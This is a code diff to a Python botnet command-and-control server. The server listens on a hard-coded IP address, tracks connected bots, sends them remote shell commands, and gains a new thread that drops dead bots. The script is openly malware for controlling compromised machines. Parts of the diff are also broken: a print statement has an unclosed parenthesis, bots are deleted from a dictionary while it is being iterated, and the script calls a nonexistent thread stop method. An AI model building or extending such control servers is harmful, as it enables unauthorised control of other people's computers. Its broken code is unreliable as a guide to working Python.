@@ -33,7 +33,7 @@ def start_server(port=2003,ip="142.93.197.240"):
         except socket.error:
             pass
 
-def test_conn(bot,addr):
+def test_conn(bot,addr):    #Arg 1 --> bot_socket, 2 --> bot_address
     try:
         bot.send("CHECK".encode())
         resp = bot.recv(1024).decode()
@@ -85,6 +85,21 @@ def shell_exec(cmd):
         elif(resp == "FAILED"):
             print("[*] Shell execution failed on %s"%(bot))
 
+def update_botnet():
+    while True:
+        try:
+            sleep(15)
+            global botnet,test_bool
+            for bot in botnet:
+                test_conn(botnet[bot],bot)
+                if(test_bool == False):
+                    print("[*] %s : Connection dead"%(bot))
+                    del botnet[bot]
+                else:
+                    pass
+        except socket.error:
+            print("[*] %s : Connection dead"%(bot))
+
 def exec_command(cmd):
     global botnet
     print("[*] Sending Command Packets...")
@@ -102,12 +117,17 @@ def exec_command(cmd):
         #print("[*] Command packet sent")
 
 def process_cmd(cmd):
-    global botnet,botnet_address
+    global botnet
     sleep(1)
+
+    if "updater" in cmd:
+        updater_thread = Thread(target=update_botnet,args=())
+        updater_thread.start()
+
     if(cmd == "show botnet"):
         count = 1
-        for bot in botnet_address:
-            print("[*] %d : %s"%(count,str(bot)))
+        for bot in botnet:
+            print("[*] %d : %s"%(count,str(bot))
             count += 1
 
     if 'execute' in cmd:
@@ -133,13 +153,14 @@ def main():
         listener_thread.start()
         sleep(2)
         while True:
-            cmd = raw_input(">>")
+            cmd = raw_input("\n>>")
             command_thread = Thread(target=process_cmd,args=(cmd,))
             command_thread.start()
             command_thread.join()
     except KeyboardInterrupt:
         print("[*] Botnet Terminated!")
-        sys.exit(0)
+        listener_thread.stop()
+        sys.exit()
 
 if __name__ == '__main__':
     main()
